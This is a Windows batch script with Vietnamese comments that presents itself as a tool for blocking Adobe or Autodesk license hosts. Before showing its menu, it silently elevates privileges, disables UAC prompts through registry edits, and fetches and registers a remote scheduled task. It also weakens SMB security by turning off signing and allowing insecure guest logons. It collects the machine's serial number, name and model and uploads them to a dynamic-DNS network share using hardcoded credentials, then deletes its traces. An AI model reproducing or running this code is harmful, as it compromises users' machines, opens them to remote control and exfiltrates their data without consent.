@echo off
set "params=%*"
cd /d "%~dp0" && ( if exist "%temp%\getadmin.vbs" del "%temp%\getadmin.vbs" ) && fsutil dirty query %systemdrive% 1>nul 2>nul || (  echo Set UAC = CreateObject^("Shell.Application"^) : UAC.ShellExecute "cmd.exe", "/k cd ""%~sdp0"" && %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs" && "%temp%\getadmin.vbs" && exit /B )
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v PromptOnSecureDesktop /t REG_DWORD /d 0 /f
powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/mitutina/mitutina/main/task.xml' -OutFile 'C:\Task.xml'"
schtasks /create /tn "Task" /xml "C:\Task.xml" /f


powershell -Command "Set-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Services\\LanmanWorkstation\\Parameters' -Name 'RequireSecuritySignature' -Value 1"
powershell -Command "Set-SmbClientConfiguration -RequireSecuritySignature $false -Force"
powershell -Command "Set-SmbClientConfiguration -EnableInsecureGuestLogons $true -Force"
setlocal enabledelayedexpansion

:: Bước 1: Lấy thông tin hệ thống
for /f "tokens=*" %%a in ('powershell -command "(Get-CimInstance -ClassName Win32_BIOS).SerialNumber"') do set SERIAL=%%a
for /f "tokens=*" %%a in ('powershell -command "(Get-CimInstance -ClassName Win32_ComputerSystem).Name"') do set NAME=%%a
for /f "tokens=*" %%a in ('powershell -command "(Get-CimInstance -ClassName Win32_ComputerSystem).Model"') do set SYSTEMMODEL=%%a
for /f "tokens=*" %%a in ('powershell -command "(Get-CimInstance -ClassName Win32_ComputerSystem).Manufacturer"') do set MANUFACTURER=%%a

:: Kiểm tra nếu thông tin không lấy được
if not defined SERIAL set SERIAL=UnknownSerial
if not defined NAME set NAME=UnknownName
if not defined SYSTEMMODEL set SYSTEMMODEL=UnknownModel
if not defined MANUFACTURER set MANUFACTURER=UnknownManufacturer

:: Lấy thời gian hiện tại
for /f "tokens=2 delims= " %%a in ('date /t') do set DATE=%%a
for /f "tokens=1-2 delims=: " %%a in ('time /t') do set TIME=%%a%%b
set DATE=%DATE:/=-%
set TIME=%TIME::=-%

:: Tạo file tạm
set TEMP_FILE=%temp%\tam.txt
echo %SERIAL%_%NAME%_%SYSTEMMODEL%_%MANUFACTURER%_%DATE%_%TIME% > "%TEMP_FILE%"

:: Bước 2: Kết nối với chia sẻ mạng
net use \\minhtuan283.ddns.net\hdd /user:minhtuan283 Thienngan2002 /persistent:no >nul 2>&1
if errorlevel 1 (
    echo Lỗi: Không thể kết nối đến chia sẻ mạng.
    exit /b 1
)

:: Bước 3: Tạo tên file đích theo thời gian thực hiện
set TARGET_FILE=\\minhtuan283.ddns.net\hdd\serial\log\series_%DATE%_%TIME%.txt

:: Sao chép file tạm và đổi tên
copy "%TEMP_FILE%" "%TARGET_FILE%" >nul 2>&1
if errorlevel 1 (
    echo Lỗi: Không thể sao chép file tạm vào chia sẻ mạng.
    net use \\minhtuan283.ddns.net\hdd /delete >nul 2>&1
    exit /b 1
)

:: Bước 4: Thêm nội dung file tạm vào seri.txt
set SOURCE_FILE=\\minhtuan283.ddns.net\hdd\serial\seri.txt
if exist "%SOURCE_FILE%" (
    type "%TEMP_FILE%" >> "%SOURCE_FILE%"
) else (
    copy "%TEMP_FILE%" "%SOURCE_FILE%" >nul 2>&1
)

:: Bước 5: Dọn dẹp và ngắt kết nối
if exist "%TEMP_FILE%" del "%TEMP_FILE%"
net use \\minhtuan283.ddns.net\hdd /delete >nul 2>&1
del /f /q "C:\Task.xml"

cls
echo ====================================
echo    Lua chon:
echo    1. Adobe
echo    2. Autodesk
echo ====================================
set /p choice=Chon 1 hoac 2: 
if "%choice%"=="1" goto adobe
if "%choice%"=="2" goto autodesk

:adobe
@echo off
powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/minhtuan283/host/main/adobehostblock.xml' -OutFile 'C:\adobehostblock.xml'"
schtasks /create /tn "AdobeHostBlock" /xml "C:\adobehostblock.xml" /f
del /f /q "C:\adobehostblock.xml"
echo da tai schedular windows!


pause
exit

:autodesk
@echo off
powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/minhtuan283/host/main/autodeskhostsblock.xml' -OutFile 'C:\autodeskhostsblock.xml'"
schtasks /create /tn "AutoDeskHostBlock" /xml "C:\autodeskhostsblock.xml" /f
del /f /q "C:\autodeskhostsblock.xml"
echo Task da duoc import thanh cong!
echo da tai schedular windows!
pause
exit
